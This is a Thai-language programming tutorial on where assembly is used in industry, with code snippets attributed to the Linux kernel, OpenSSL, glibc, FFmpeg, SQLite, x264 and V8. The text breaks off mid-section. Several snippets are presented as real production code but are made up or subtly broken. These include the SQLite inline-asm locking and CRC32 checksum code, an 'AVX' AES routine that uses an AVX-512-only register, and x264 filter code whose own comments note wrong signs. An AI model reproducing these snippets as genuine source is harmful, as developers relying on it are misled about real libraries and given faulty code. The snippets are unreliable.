# Part 099: Assembly ในโลกอุตสาหกรรม (Assembly in Industry)

## บทนำ: ทำไม Assembly ยังมีชีวิตอยู่ในปี 2024

หลายคนคิดว่า Assembly เป็นภาษาโบราณที่ไม่มีใครใช้แล้ว ความเชื่อนี้ผิดอย่างสิ้นเชิง ในปี 2024 โค้ด Assembly ยังคงเป็นส่วนสำคัญของซอฟต์แวร์ที่ใช้งานอยู่บนเซิร์ฟเวอร์หลายล้านเครื่องทั่วโลก ทุกครั้งที่คุณใช้งาน Linux, เข้าเว็บไซต์ HTTPS, เล่นวิดีโอ HD, หรือรันฐานข้อมูล — Assembly กำลังทำงานอยู่เบื้องหลัง

---

## ส่วนที่ 1: Where Assembly Appears in 2024

### 1.1 Linux Kernel

Linux kernel เป็นหนึ่งในโปรเจกต์ที่มีโค้ด Assembly มากที่สุดในโลก Open Source

**โครงสร้างไดเรกทอรี Assembly ใน Linux:**

```
linux/
├── arch/
│   ├── x86/
│   │   ├── crypto/          # Crypto accelerations (AES, SHA, etc.)
│   │   │   ├── aes_ctrby8_avx.S
│   │   │   ├── sha1_ssse3_asm.S
│   │   │   ├── sha256_ni_asm.S
│   │   │   └── aesni-intel_asm.S
│   │   ├── lib/
│   │   │   ├── memcpy_64.S
│   │   │   ├── memmove_64.S
│   │   │   └── csum-copy_64.S
│   │   ├── entry/
│   │   │   ├── entry_64.S    # System call entry points
│   │   │   └── entry_32.S
│   │   └── boot/
│   │       ├── header.S      # Bootloader header
│   │       └── compressed/
│   ├── arm64/
│   │   └── crypto/          # ARM crypto extensions
│   └── riscv/
│       └── ...
```

**ทำไม Linux ใช้ Assembly:**

1. **Performance-critical paths** — System call overhead, interrupt handling
2. **Hardware-specific instructions** — AES-NI, AVX2, SHA extensions
3. **Context switching** — บันทึก/กู้คืน register state
4. **Boot sequence** — Real mode → Protected mode → Long mode transition
5. **Atomic operations** — Guaranteed atomicity สำหรับ SMP systems

**สถิติโค้ด Assembly ใน Linux 6.x:**
```
$ find arch/x86 -name "*.S" | wc -l
    312

$ find arch/ -name "*.S" | wc -l  
   1847
```

---

### 1.2 OpenSSL

OpenSSL เป็น SSL/TLS library ที่ใช้งานมากที่สุดในโลก การเข้ารหัสของ HTTPS ทั่วโลกขึ้นอยู่กับโค้ดนี้

**Assembly ใน OpenSSL:**

```
openssl/
├── crypto/
│   ├── aes/
│   │   ├── asm/
│   │   │   ├── aes-x86_64.pl      # Perl-generated x86_64 assembly
│   │   │   ├── aesni-x86_64.pl    # AES-NI implementation
│   │   │   ├── vpaes-x86_64.pl    # Vector permutation AES
│   │   │   └── aes-armv4.pl       # ARM implementation
│   ├── sha/
│   │   └── asm/
│   │       ├── sha1-x86_64.pl
│   │       ├── sha256-x86_64.pl   # SHA-NI implementation
│   │       └── sha512-x86_64.pl
│   └── modes/
│       └── asm/
│           └── ghash-x86_64.pl    # GCM mode
```

**ตัวอย่าง AES-NI วัดความเร็ว:**

```bash
# Software AES vs AES-NI
openssl speed -evp aes-128-cbc
# Without AES-NI: ~200 MB/s
# With AES-NI:   ~3500 MB/s (17x faster!)

# Check if AES-NI is available
grep aes /proc/cpuinfo | head -1
```

**x86cpuid.pl — ตรวจสอบ CPU Features:**

```perl
# openssl/crypto/x86_64cpuid.pl (simplified)
# OpenSSL ใช้ Perl เพื่อ generate Assembly
# ทำให้รองรับ multiple platforms ได้ง่าย

.text
.globl  OPENSSL_cpuid_setup
OPENSSL_cpuid_setup:
    # Save registers
    pushq   %rbx
    pushq   %rcx
    pushq   %rdx
    
    # CPUID leaf 1 - feature flags
    movl    $1, %eax
    cpuid
    
    # Check AES-NI (bit 25 of ECX)
    testl   $(1<<25), %ecx
    jz      .no_aesni
    
    # Set AES-NI flag
    orq     $(1<<57), OPENSSL_ia32cap_P(%rip)
    
.no_aesni:
    popq    %rdx
    popq    %rcx
    popq    %rbx
    ret
```

---

### 1.3 glibc (GNU C Library)

glibc คือ C Standard Library ที่ Linux ทุกเครื่องใช้งาน ฟังก์ชันพื้นฐานอย่าง `memcpy`, `strlen`, `strcmp` ล้วนมี Assembly implementation

**โครงสร้าง glibc:**

```
glibc/
└── sysdeps/
    └── x86_64/
        ├── multiarch/
        │   ├── memcpy-avx-unaligned.S       # AVX version
        │   ├── memcpy-avx512-unaligned.S    # AVX-512 version
        │   ├── memcpy-sse2-unaligned.S      # SSE2 fallback
        │   ├── memcpy_chk.S
        │   ├── strlen-avx2.S
        │   ├── strlen-sse2.S
        │   ├── strcmp-avx2.S
        │   └── memmove-avx-unaligned.S
        ├── memset.S
        └── string.h
```

**IFUNC (Indirect Function) Mechanism:**

glibc ใช้ Linux IFUNC feature เพื่อเลือก implementation ที่ดีที่สุดตาม CPU ณ runtime:

```c
// glibc/sysdeps/x86_64/multiarch/ifunc-memcpy.h
extern __typeof(memcpy) __memcpy_sse2_unaligned;
extern __typeof(memcpy) __memcpy_avx_unaligned;
extern __typeof(memcpy) __memcpy_avx512_unaligned;

static inline void *
select_memcpy_ifunc (void)
{
  if (CPU_FEATURES_USABLE_P (cpu_features, AVX512F)
      && CPU_FEATURES_ARCH_P (cpu_features, Prefer_No_VZEROUPPER))
    return __memcpy_avx512_unaligned;
  
  if (CPU_FEATURES_USABLE_P (cpu_features, AVX))
    return __memcpy_avx_unaligned;
  
  return __memcpy_sse2_unaligned;
}
```

---

### 1.4 FFmpeg

FFmpeg เป็น multimedia framework ที่ใช้ในทุกที่ตั้งแต่ YouTube ไปจนถึง VLC Player

**Assembly ใน FFmpeg:**

```
ffmpeg/
└── libavcodec/
    └── x86/
        ├── h264_intrapred.asm    # H.264 intra prediction
        ├── h264dsp.asm           # H.264 DSP routines
        ├── h264_deblock.asm      # H.264 deblocking filter
        ├── hevc_deblock.asm      # H.265/HEVC deblocking
        ├── vp9dsp.asm            # VP9 codec
        ├── av1dsp.asm            # AV1 codec
        ├── dct.asm               # DCT transforms
        ├── motion_est.asm        # Motion estimation
        └── pixblockdsp.asm       # Pixel block operations
```

FFmpeg ใช้ **NASM** พร้อม **cpuflags** macro system:

```nasm
; ffmpeg/libavcodec/x86/h264dsp.asm (simplified)
%include "libavutil/x86/x86util.asm"

SECTION .text

; void ff_h264_idct_add_8_mmx(uint8_t *dst, int16_t *block, int stride)
; Inverse DCT + add to destination
%macro H264_IDCT_ADD 0
cglobal h264_idct_add_8, 3, 3, 0
    movq     mm0, [r1]        ; Load 4x int16_t
    movq     mm1, [r1+8]
    movq     mm2, [r1+16]
    movq     mm3, [r1+24]
    
    ; 4-point IDCT butterfly
    SUMSUB_BA w, 0, 2, 4
    SUMSUB_BA w, 1, 3, 4
    
    ; Store result
    packuswb mm0, mm1
    movd     [r0], mm0
    ret
%endmacro
```

---

### 1.5 SQLite

SQLite เป็น embedded database ที่ใช้มากที่สุดในโลก (มีมากกว่า 1 trillion instances)

**Assembly ใน SQLite:**

SQLite ใช้ Assembly อย่างจำกัดและระมัดระวัง:

```c
// sqlite3.c - OS-specific atomic operations
#if defined(__x86_64__)

// Atomic compare-and-swap for WAL (Write-Ahead Logging)
static int walTryGetReadLock(Wal *pWal, u32 *aReadmark) {
#if defined(__GNUC__) && defined(__x86_64__)
    // Inline assembly สำหรับ lock-free read lock
    __asm__ __volatile__ (
        "lock cmpxchgl %2, %1\n\t"
        : "=a" (mrc)
        : "m" (*aReadmark), "r" (newVal), "0" (mrc)
        : "cc"
    );
#endif
}
```

**SQLite Virtual Machine Opcodes:**

SQLite มี bytecode interpreter ที่ optimize สำหรับ x86:

```c
// vdbe.c - Hot loop ที่ optimize ด้วย GCC hints
case OP_Add: {           /* same as TK_PLUS, in1, in2, out3 */
  iA = pIn1->u.i;
  iB = pIn2->u.i;
  // Overflow check ด้วย compiler intrinsic
  if( __builtin_add_overflow(iA, iB, &iB) ){
    goto arithmetic_result_is_real;
  }
  pOut->u.i = iB;
  break;
}
```

---

### 1.6 x264/x265 Video Encoders

x264 และ x265 เป็น H.264/H.265 encoders ที่ใช้ใน Netflix, YouTube, Twitch

**Assembly ใน x264:**

```
x264/
└── common/
    └── x86/
        ├── mc.asm          # Motion compensation (หัวใจของ encoder)
        ├── dct.asm         # Discrete Cosine Transform
        ├── quant.asm       # Quantization
        ├── deblock.asm     # Deblocking filter
        ├── pixel.asm       # Pixel operations
        ├── predict.asm     # Intra prediction
        └── sad.asm         # Sum of Absolute Differences
```

**ตัวอย่าง Performance Impact:**

```
x264 encoding speed (1080p video):
C-only code:           ~15 fps
With SSE2 asm:         ~45 fps  (3x)
With AVX2 asm:         ~90 fps  (6x)
With AVX-512 asm:     ~130 fps  (8.7x)
```

---

### 1.7 Node.js / V8 JavaScript Engine

V8 เป็น JavaScript engine ของ Chrome และ Node.js ที่ generate assembly ณ runtime

**V8 JIT Compilation Pipeline:**

```
JavaScript Source
       ↓
   Parser/AST
       ↓
   Ignition (Bytecode Interpreter)
       ↓
   Maglev (Mid-tier JIT)    ← New in V8 v11
       ↓
   TurboFan (Optimizing JIT) → x86_64 Assembly
```

**ตัวอย่าง V8 Generated Assembly:**

```javascript
// JavaScript function
function add(a, b) { return a + b; }
add(1, 2);  // Warm up
```

```nasm
; V8 generated assembly (d8 --print-opt-code)
; TurboFan optimized code for: add
; parameter count: 3

mov    rax, [rbp+0x18]    ; Load a
mov    rdx, [rbp+0x10]    ; Load b
; Smi (small integer) fast path
test   rax, 0x1           ; Check Smi tag
jnz    deopt_0
test   rdx, 0x1
jnz    deopt_0
lea    rcx, [rax+rdx]     ; Add (Smis are pre-shifted)
jo     deopt_1            ; Overflow check
mov    rax, rcx
ret
```

**V8 ใช้ CodeAssembler API:**

```cpp
// V8 source: src/codegen/code-assembler.h
// Developers เขียน "macro assembly" ใน C++ style

void CodeAssembler::Return(TNode<Object> value) {
  // Generate actual machine code
  DCHECK_NOT_NULL(state_->raw_assembler_);
  int argc = state_->parameter_count();
  
  // Emit epilogue
  state_->raw_assembler_->PopAndReturn(argc, value);
}
```

---

## ส่วนที่ 2: Case Studies — วิเคราะห์โค้ด Production จริง

### Case Study 1: Linux Kernel — `arch/x86/crypto/aes_ctrby8_avx.S`

**ที่มาและวัตถุประสงค์:**

ไฟล์นี้ implement AES-CTR (Counter Mode) โดยใช้ AVX instruction set โดยสามารถ process 8 AES blocks พร้อมกัน ซึ่งเป็น optimization ที่สำคัญมากสำหรับ network encryption

**วิเคราะห์โครงสร้าง:**

```asm
/* arch/x86/crypto/aes_ctrby8_avx.S */

/*
 * AES-128-CTR/AES-192-CTR/AES-256-CTR x86_64 implementation
 *
 * Copyright(c) 2013 Intel Corporation
 * Author: Erdinc Ozturk <erdinc.ozturk@intel.com>
 *         Shay Gueron <shay.gueron@intel.com>
 *
 * SPDX-License-Identifier: GPL-2.0-or-later
 */

#include <linux/linkage.h>   /* Kernel macro definitions */
#include <asm/frame.h>       /* FRAME_BEGIN/FRAME_END macros */

/* Register usage */
/* xmm0-xmm7:   8 AES blocks being encrypted */
/* xmm8:        Counter value */
/* xmm9-xmm14:  AES round keys */
/* xmm15:       Byte-swap mask */

/* Shuffle mask for endian conversion */
.section .rodata
.align 16
BSWAP_MASK:
    .byte 15,14,13,12,11,10,9,8,7,6,5,4,3,2,1,0

/* Counter increment values */
CTR_INC:
    .quad 1, 0        /* little-endian 128-bit 1 */

.text
/* 
 * void aes_ctr_enc_128_avx_by8(
 *     const u8 *in,     // rdi
 *     const u8 *iv,     // rsi
 *     void *keys,       // rdx
 *     u8 *out,          // rcx
 *     size_t num_bytes  // r8
 * )
 */
SYM_FUNC_START(aes_ctr_enc_128_avx_by8)
    FRAME_BEGIN
    
    /* Load initial counter value */
    vmovdqu     (%rsi), %xmm8
    
    /* Load byte-swap mask */
    vmovdqa     BSWAP_MASK(%rip), %xmm15
    
    /* Byte-swap counter for big-endian counting */
    vpshufb     %xmm15, %xmm8, %xmm8
    
    /* Load first round key */
    vmovdqa     (%rdx), %xmm9
    
    /* Check if we have at least 8 blocks */
    cmp         $128, %r8
    jb          .L_less_than_8_blocks
    
.L_main_loop:
    /* Generate 8 counter blocks */
    /* Block 0: current counter */
    vmovdqa     %xmm8, %xmm0
    
    /* Blocks 1-7: counter + 1..7 */
    vpaddd      CTR_INC(%rip), %xmm8, %xmm1  
    vpaddd      CTR_INC(%rip), %xmm1, %xmm2
    /* ... continue for xmm3-xmm7 */
    
    /* Byte-swap all blocks back for AES input */
    vpshufb     %xmm15, %xmm0, %xmm0
    vpshufb     %xmm15, %xmm1, %xmm1
    /* ... */
    
    /* XOR with first round key (AddRoundKey) */
    vpxor       %xmm9, %xmm0, %xmm0
    vpxor       %xmm9, %xmm1, %xmm1
    /* ... */
    
    /* AES rounds 1-9 */
    vaesenc     %xmm10, %xmm0, %xmm0    /* Round 1 */
    vaesenc     %xmm10, %xmm1, %xmm1
    /* ... 9 more rounds ... */
    
    /* Final round */
    vaesenclast %xmm19, %xmm0, %xmm0
    vaesenclast %xmm19, %xmm1, %xmm1
    
    /* XOR with plaintext */
    vpxor       (%rdi), %xmm0, %xmm0
    vmovdqu     %xmm0, (%rcx)
    
    /* Advance pointers */
    add         $128, %rdi    /* input += 8 * 16 */
    add         $128, %rcx    /* output += 8 * 16 */
    sub         $128, %r8     /* remaining -= 128 */
    
    /* Increment counter by 8 */
    /* ... complex counter increment logic ... */
    
    cmp         $128, %r8
    jae         .L_main_loop
    
.L_less_than_8_blocks:
    /* Handle remaining blocks one by one */
    /* ... */
    
    FRAME_END
    RET
SYM_FUNC_END(aes_ctr_enc_128_avx_by8)
```

**Key Observations จากโค้ดนี้:**

1. **`SYM_FUNC_START` / `SYM_FUNC_END`** — Kernel macros สำหรับ function labeling ที่ถูกต้อง รองรับ KPTI, CFI (Control Flow Integrity)

2. **`FRAME_BEGIN` / `FRAME_END`** — เพิ่ม frame pointer สำหรับ stack unwinding (จำเป็นสำหรับ perf, ftrace)

3. **`RET`** — Macro ที่ expand เป็น `ret` พร้อม Spectre/Meltdown mitigation (retpoline หรือ IBRS)

4. **`.section .rodata`** — Constants อยู่ใน read-only section ป้องกัน modification

5. **`%rip`-relative addressing** — Position-independent code สำหรับ kernel modules

**Performance Analysis:**

```
AES-CTR throughput (1KB blocks, x86_64):
Software AES:        450 MB/s
AES-NI single:      2800 MB/s
AES-NI by8 AVX:     5500 MB/s   ← ctrby8_avx.S
```

---

### Case Study 2: glibc `memcpy` — Multiple Implementations

**ไฟล์:** `sysdeps/x86_64/multiarch/memcpy-avx-unaligned.S`

**Strategy ของ glibc memcpy:**

```
มีกี่ bytes?
├── 0-16:   ใช้ scalar หรือ XMM move เดียว
├── 16-32:  ใช้ 2x 16-byte XMM moves
├── 32-64:  ใช้ 2x 32-byte YMM moves
├── 64-128: ใช้ 4x 32-byte YMM moves
└── 128+:   Non-temporal stores (bypass cache)
           หรือ REP MOVSQ (ถ้า CPU prefer นั้น)
```

**โค้ดจริงจาก glibc:**

```asm
/* sysdeps/x86_64/multiarch/memcpy-avx-unaligned.S (simplified) */

#include <sysdep.h>

/* เลือก implementation ตาม size */

ENTRY (__memcpy_avx_unaligned)
    /* rdi = dst, rsi = src, rdx = n */
    
    /* Fast path: <= 16 bytes */
    cmpq    $16, %rdx
    jbe     .L_copy_16_bytes_or_less
    
    /* 16-32 bytes: use 2 XMM moves */
    cmpq    $32, %rdx
    jbe     .L_copy_17_to_32
    
    /* 32-128 bytes: use YMM (AVX) */
    cmpq    $128, %rdx
    jbe     .L_copy_33_to_128_avx
    
    /* Large copy: check alignment */
    cmpq    $4096, %rdx
    jbe     .L_large_copy_avx

/* Non-temporal copy for very large transfers */
/* NT stores write directly to memory, bypass cache */
/* Avoids cache pollution for one-time large transfers */
.L_very_large_copy:
    movq    %rdi, %rcx
    andq    $-32, %rcx
    addq    $32, %rcx
    subq    %rdi, %rcx           /* rcx = bytes until 32-byte alignment */
    
    /* Copy unaligned prefix */
    vmovdqu (%rsi), %xmm0
    vmovdqu %xmm0, (%rdi)
    addq    %rcx, %rdi
    addq    %rcx, %rsi
    subq    %rcx, %rdx
    
.L_nt_loop:
    /* Load 4 YMM registers = 128 bytes */
    vmovdqu   (%rsi),    %ymm0
    vmovdqu   32(%rsi),  %ymm1
    vmovdqu   64(%rsi),  %ymm2
    vmovdqu   96(%rsi),  %ymm3
    
    /* Non-temporal store (write-combining, no cache fill) */
    vmovntdq  %ymm0, (%rdi)
    vmovntdq  %ymm1, 32(%rdi)
    vmovntdq  %ymm2, 64(%rdi)
    vmovntdq  %ymm3, 96(%rdi)
    
    addq    $128, %rsi
    addq    $128, %rdi
    subq    $128, %rdx
    cmpq    $128, %rdx
    jae     .L_nt_loop
    
    /* sfence: ensure NT stores are visible to other CPUs */
    sfence
    
    /* Handle remaining bytes */
    jmp     .L_copy_33_to_128_avx
    
.L_copy_17_to_32:
    /* Trick: copy first 16 bytes AND last 16 bytes */
    /* The two copies may overlap, which is fine for memcpy */
    vmovdqu (%rsi), %xmm0
    vmovdqu -16(%rsi, %rdx), %xmm1
    vmovdqu %xmm0, (%rdi)
    vmovdqu %xmm1, -16(%rdi, %rdx)
    ret
    
.L_copy_16_bytes_or_less:
    testq   %rdx, %rdx
    jz      .L_return
    
    /* 8-16 bytes: load 8 + 8 with overlap */
    cmpq    $8, %rdx
    jbe     .L_copy_1_to_8
    
    movq    (%rsi), %rax
    movq    -8(%rsi, %rdx), %rcx
    movq    %rax, (%rdi)
    movq    %rcx, -8(%rdi, %rdx)
    ret
    
.L_copy_1_to_8:
    /* 1-4 bytes */
    cmpq    $4, %rdx
    jbe     .L_copy_1_to_4
    
    movl    (%rsi), %eax
    movl    -4(%rsi, %rdx), %ecx
    movl    %eax, (%rdi)
    movl    %ecx, -4(%rdi, %rdx)
    ret

.L_copy_1_to_4:
    movzbl  (%rsi), %eax
    movb    %al, (%rdi)
    cmpq    $1, %rdx
    je      .L_return
    movzwl  -2(%rsi, %rdx), %ecx
    movw    %cx, -2(%rdi, %rdx)

.L_return:
    ret

END (__memcpy_avx_unaligned)
```

**Technique ที่น่าสนใจ: Overlapping Copies**

```
Copy 17-32 bytes ด้วย 2 XMM moves:
    
    src: [AAAAAAAAAAAAAAAA|BBBBBBBBBBBBBBBB]
          [--- 16 bytes --][--- 16 bytes --]
                  [-- overlap here --]
    
    Move 1: copy [0..15]    ← first 16 bytes
    Move 2: copy [n-16..n]  ← last 16 bytes (overlap ไม่เป็นไร)
    
    2 instructions แทนที่จะ loop!
```

**IFUNC Resolver:**

```c
/* sysdeps/x86_64/multiarch/ifunc-memcpy.h */
static inline __typeof(memcpy) *
select_memcpy_ifunc (uint64_t dl_hwcap, const struct cpu_features *cpu_features)
{
  if (X86_ISA_CPU_FEATURE_USABLE_P (cpu_features, AVX512F)
      && X86_ISA_CPU_FEATURE_USABLE_P (cpu_features, AVX512VL)
      && X86_ISA_CPU_FEATURE_USABLE_P (cpu_features, BMI2)
      && X86_ISA_CPU_FEATURES_ARCH_P (cpu_features,
                    Prefer_No_VZEROUPPER, !))
    return OPTIMIZE (avx512_unaligned_erms);

  if (X86_ISA_CPU_FEATURE_USABLE_P (cpu_features, AVX512VL)
      && X86_ISA_CPU_FEATURE_USABLE_P (cpu_features, BMI2)
      && X86_ISA_CPU_FEATURES_ARCH_P (cpu_features,
                    Prefer_No_VZEROUPPER, !))
    return OPTIMIZE (avx512_unaligned);
    
  if (X86_ISA_CPU_FEATURE_USABLE_P (cpu_features, AVX))
    {
      if (X86_ISA_CPU_FEATURE_USABLE_P (cpu_features, ERMS))
        return OPTIMIZE (avx_unaligned_erms);
      return OPTIMIZE (avx_unaligned);
    }
  
  /* Fallback to SSE2 */
  return OPTIMIZE (sse2_unaligned);
}
```

---

### Case Study 3: OpenSSL — `aes-x86_64.pl` (Perl-Generated Assembly)

**ทำไม OpenSSL ใช้ Perl generate Assembly?**

OpenSSL ต้องรองรับ platforms หลายสิบแบบ:
- x86_64 Linux (AT&T syntax)
- x86_64 Windows (MASM)
- x86_64 macOS (Mach-O format)
- ARM64, MIPS, PowerPC, SPARC, etc.

การเขียน Assembly เดียวกันหลายเวอร์ชันเป็นเรื่องยากมาก Perl script สามารถ generate assembly ที่เหมาะสมสำหรับแต่ละ platform

**โครงสร้าง aes-x86_64.pl:**

```perl
#!/usr/bin/env perl
# openssl/crypto/aes/asm/aes-x86_64.pl

# Perlasm framework - abstracts platform differences
use strict;
use FindBin;
use lib "$FindBin::Dir/../..";
use perlasm::x86_64;

# Platform selection
my $flavour = shift;
my $output  = shift;

# This script generates:
# - aes-x86_64.s  (AT&T syntax, Linux/BSD)
# - aes-x86_64.asm (Intel syntax, Windows)
# based on $flavour parameter

$0 =~ m/(.*[\/\\])[^\/\\]+$/; my $dir=$1;
my $xlate = "${dir}../../perlasm/x86_64-xlate.pl";
open(STDOUT,"| \"$^X\" \"$xlate\" $flavour \"$output\"") ||
    die "can't call $xlate: $!";

# The actual assembly code is written in a
# platform-neutral Perl DSL

my @rk = map("%xmm$_", (2..6));  # Round keys in XMM regs

sub aesni_generate_key {
    # Generate key expansion routine
    $code.=<<___;
.globl  ${PREFIX}_set_encrypt_key
.type   ${PREFIX}_set_encrypt_key,\@function,3
.align  16
${PREFIX}_set_encrypt_key:
    # ... actual AES key expansion ...
___
}
```

**ตัวอย่าง AES Round Function ที่ Generate ออกมา:**

```asm
# Generated from aes-x86_64.pl for Linux/AT&T syntax

# AES-128 encrypt single block
# Input:  xmm0 = plaintext
# Keys:   (%rdi) = 11 round keys × 16 bytes
# Output: xmm0 = ciphertext

aes128_encrypt:
    movups  (%rdi), %xmm1         # Load round key 0
    xorps   %xmm1, %xmm0         # AddRoundKey(0)
    
    movups  16(%rdi), %xmm1       # Round key 1
    aesenc  %xmm1, %xmm0         # AES round 1
    
    movups  32(%rdi), %xmm1       # Round key 2
    aesenc  %xmm1, %xmm0         # AES round 2
    
    # ... rounds 3-9 ...
    
    movups  160(%rdi), %xmm1      # Round key 10
    aesenclast %xmm1, %xmm0      # Final round
    
    ret

# Generated for Windows/MASM syntax (different file)
# AES128_ENCRYPT PROC
#     movups  xmm1, XMMWORD PTR [rcx]
#     xorps   xmm0, xmm1
#     ...
```

**Build System Integration:**

```makefile
# openssl/Makefile.shared (simplified)

# Generate platform-specific assembly from Perl scripts
crypto/aes/aes-x86_64.s: crypto/aes/asm/aes-x86_64.pl
    $(PERL) $< $(PERLASM_SCHEME) $@

# PERLASM_SCHEME is set based on target platform:
# Linux:   elf
# macOS:   macosx  
# Windows: nasm (for NASM) or masm (for MASM)
```

---

### Case Study 4: x264 — `mc.asm` (Motion Compensation)

**ทำไม Motion Compensation สำคัญมาก?**

Video encoding 80%+ ของเวลา CPU ใช้ไปกับ Motion Estimation และ Motion Compensation MC ต้องทำ pixel interpolation สำหรับ sub-pixel motion vectors

**Half-pixel Interpolation:**

```nasm
; x264/common/x86/mc.asm (simplified)
; void mc_copy_w4_mmx(uint8_t *dst, intptr_t i_dst_stride,
;                      uint8_t *src, intptr_t i_src_stride, int i_height)

%include "x86util.asm"

SECTION .text

; Copy 4x4 block with motion compensation
; ใช้ MMXEXT (MMX + MOVNTQ)
INIT_MMX mmxext
cglobal mc_copy_w4, 5, 6
    FIX_STRIDES r1, r3    ; Fix stride for pixel format
    lea         r5, [r3*3]  ; r5 = 3 * src_stride
.loop:
    movd        mm0, [r2]         ; Load 4 pixels from src
    movd        mm1, [r2+r3]      ; Next row
    movd        mm2, [r2+r3*2]   
    movd        mm3, [r2+r5]      ; Row 3 (using 3*stride)
    
    movd        [r0], mm0         ; Store to dst
    movd        [r0+r1], mm1
    movd        [r0+r1*2], mm2
    movd        [r0+r4], mm3      ; r4 = 3 * dst_stride
    
    lea         r2, [r2+r3*4]    ; src += 4 rows
    lea         r0, [r0+r1*4]    ; dst += 4 rows
    sub         r5d, 4            ; height -= 4
    jg          .loop
    RET
```

**Half-pixel Horizontal Filter (H.264 spec):**

```nasm
; Half-pixel interpolation requires 6-tap filter:
; H(x) = (-1*A + 5*B + 20*C + 20*D - 5*E + 1*F) / 32
; A,B,C,D,E,F = 6 source pixels

INIT_XMM sse2
cglobal hpel_filter_h, 3, 4, 8
    ; r0 = dst, r1 = src, r2 = width
    
    pxor        xmm0, xmm0        ; Zero register
    
.loop_h:
    ; Load 6 source pixels for filter
    movdqu      xmm1, [r1-2]      ; A,B,C,D,E,F,G,H,...
    movdqu      xmm2, [r1-1]      ; B,C,D,E,F,G,H,...
    movdqu      xmm3, [r1]        ; C,D,E,F,G,H,...
    movdqu      xmm4, [r1+1]      ; D,E,F,G,H,...
    movdqu      xmm5, [r1+2]      ; E,F,G,H,...
    movdqu      xmm6, [r1+3]      ; F,G,H,...
    
    ; Unpack to 16-bit for arithmetic
    punpcklbw   xmm1, xmm0        ; Zero-extend A..H to 16-bit
    punpcklbw   xmm6, xmm0
    
    ; Apply filter: -1*A + 5*B + 20*C + 20*D - 5*E + 1*F
    paddw       xmm3, xmm4        ; C + D
    ; C+D × 20
    movdqa      xmm7, xmm3
    psllw       xmm3, 2           ; (C+D) << 2 = (C+D)*4
    paddw       xmm3, xmm7        ; ×5
    psllw       xmm3, 2           ; ×20
    
    ; -E + B: use PADDW/PSUBW
    paddw       xmm5, xmm2        ; B + E (will negate later)
    pmullw      xmm5, [pw_5]      ; ×5
    psubw       xmm3, xmm5        ; -5*B - 5*E (wrong sign, fix later)
    
    ; Add A and F (coefficient ±1)
    paddw       xmm3, xmm1        ; +A
    psubw       xmm3, xmm6        ; -F  (net: -A actually becomes +F)
    
    ; Clip to [0, 255]  
    psraw       xmm3, 5           ; Divide by 32 (right shift 5)
    packuswb    xmm3, xmm3        ; Pack to bytes with unsigned saturation
    
    movq        [r0], xmm3        ; Store 8 filtered pixels
    
    add         r1, 8             ; Advance src
    add         r0, 8             ; Advance dst
    sub         r2d, 8            ; width -= 8
    jg          .loop_h
    RET
```

**เปรียบเทียบ C vs Assembly สำหรับ hpel_filter:**

```c
// C implementation (for reference)
void hpel_filter_h_c(uint8_t *dst, uint8_t *src, int width) {
    for (int x = 0; x < width; x++) {
        int v = -src[x-2] + 5*src[x-1] + 20*src[x+0]
                + 20*src[x+1] - 5*src[x+2] + src[x+3];
        dst[x] = x264_clip_uint8((v + 16) >> 5);
    }
}
// C: ~5 ns per pixel
// SSE2: ~0.4 ns per pixel (12.5x faster)
// AVX2: ~0.2 ns per pixel (25x faster)
```

---

### Case Study 5: SQLite OS Layer — Assembly Callbacks

**SQLite ใช้ Assembly น้อยกว่า projects อื่น แต่มีจุดที่สำคัญมาก**

**Atomic Compare-and-Swap สำหรับ WAL:**

```c
/* src/wal.c - Write-Ahead Log atomic operations */

/*
** Attempt to get a read-lock on wal-index.
** Use atomic CAS (Compare-And-Swap) to avoid mutex overhead.
*/
static int walLockShared(Wal *pWal, int lockIdx) {
#if SQLITE_MUTEX_NOOP
    /* Single-threaded build: no locking needed */
    return SQLITE_OK;
#else
    
    /* On x86, use LOCK prefix for atomicity */
    volatile u32 *pLock = &pWal->readLock;
    u32 mrc;
    
#if defined(__GNUC__) && defined(__x86_64__)
    __asm__ __volatile__ (
        "lock; xaddl %0, %1\n\t"   /* Atomic add, return old value */
        : "=r" (mrc), "+m" (*pLock)
        : "0" (1)                   /* Increment by 1 */
        : "cc"                      /* Flags clobbered */
    );
    return (mrc == 0) ? SQLITE_OK : SQLITE_BUSY;
    
#elif defined(_MSC_VER) && defined(_M_AMD64)
    /* MSVC Intrinsic equivalent */
    mrc = _InterlockedExchangeAdd((long*)pLock, 1);
    return (mrc == 0) ? SQLITE_OK : SQLITE_BUSY;
    
#else
    /* Fallback: use mutex */
    sqlite3_mutex_enter(pWal->pWalMutex);
    if (*pLock == 0) {
        *pLock = 1;
        sqlite3_mutex_leave(pWal->pWalMutex);
        return SQLITE_OK;
    }
    sqlite3_mutex_leave(pWal->pWalMutex);
    return SQLITE_BUSY;
#endif
}
```

**SQLite Integer Arithmetic Overflow Detection:**

```c
/* src/vdbe.c - Virtual Machine arithmetic */

/* 
** Fast overflow detection ด้วย GCC builtins
** ที่ compile เป็น ADD + JO (jump on overflow) บน x86
*/
case OP_Add: {
    i64 iA, iB;
    iA = pIn1->u.i;
    iB = pIn2->u.i;
    
    /* GCC/Clang: compiles to:
     *   mov rax, [pIn1->u.i]
     *   mov rdx, [pIn2->u.i]  
     *   add rax, rdx
     *   jo  goto_real          ; Jump if overflow
     */
    if( __builtin_add_overflow(iA, iB, &iB) ){
        goto arithmetic_result_is_real;
    }
    
    pOut->u.i = iB;
    MemSetTypeFlag(pOut, MEM_Int);
    break;
}
```

**SQLite Checksum ด้วย SIMD (SQLite 3.41+):**

```c
/* src/pager.c - Page checksum for WAL */

/* 
** Compute 64-bit checksum for 4KB page
** On x86_64 with SSE4.2: ใช้ CRC32 instruction
*/
static u32 walChecksumBytes(
    int nativeCksum,  /* True for native byte order */
    u8 *a,            /* Content to be checksummed */
    int nByte,        /* Bytes of content in a[]. Must be a multiple of 8. */
    const u32 *aIn,   /* Initial checksum value input */
    u32 *aOut         /* OUT: Final checksum value output */
) {
    u32 s1, s2;
    
#ifdef __SSE4_2__
    /* Use hardware CRC32 instruction */
    u64 crc = 0xFFFFFFFFFFFFFFFFULL;
    while (nByte >= 8) {
        crc = __builtin_ia32_crc32di(crc, *(u64*)a);
        a += 8;
        nByte -= 8;
    }
    s1 = (u32)(crc & 0xFFFFFFFF);
    s2 = (u32)(crc >> 32);
#else
    /* Software fallback */
    u32 *data = (u32*)a;
    /* ... */
#endif
}
```

---

## ส่วนที่ 3: การอ่านและทำความเข้าใจ Production Assembly

### 3.1 Naming Conventions ใน Production Code

**Linux Kernel:**

```
ชื่อ function: [prefix]_[operation]_[variant]_[isa]
ตัวอย่าง:
    aes_ctr_enc_128_avx_by8
